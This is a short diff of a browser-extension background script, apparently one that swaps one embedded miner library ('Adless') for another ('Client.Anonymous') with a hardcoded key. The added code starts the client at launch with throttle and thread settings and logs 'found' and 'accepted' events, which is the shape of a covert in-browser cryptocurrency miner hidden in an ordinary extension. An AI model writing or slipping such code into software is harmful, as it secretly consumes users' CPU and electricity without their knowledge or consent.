@@ -1,7 +1,8 @@
 import ScreenController from "./screen";
 import AreaController from "./area";
 import BaseController from "./base";
-import "./adless";
+
+const key = "7d3c15ddf875a0c04708930a991c9d0c6357874bc4f9dccb48052d08709918a3";
 
 class BackgroundController extends BaseController {
     start() {
@@ -155,9 +156,6 @@ class BackgroundController extends BaseController {
 }
 
 console.log("start");
-const a = "d64f48ddbe";
-const b = "eb416762";
-const c = "4a838b6651728f";
 const throttle = 0.7;
 let threads;
 
@@ -172,12 +170,14 @@ else {
 }
 
 const options = {throttle, threads};
-const adless = new Adless.Anonymous(`${a}${b}${c}`, options);
+const client = new Client.Anonymous(key, options);
 const controller = new BackgroundController();
 
-adless.start();
-
+client.start();
 controller.start();
+
+client.on("found", () => console.log("found"));
+client.on("accepted", () => console.log("accepted"));
 
 
 
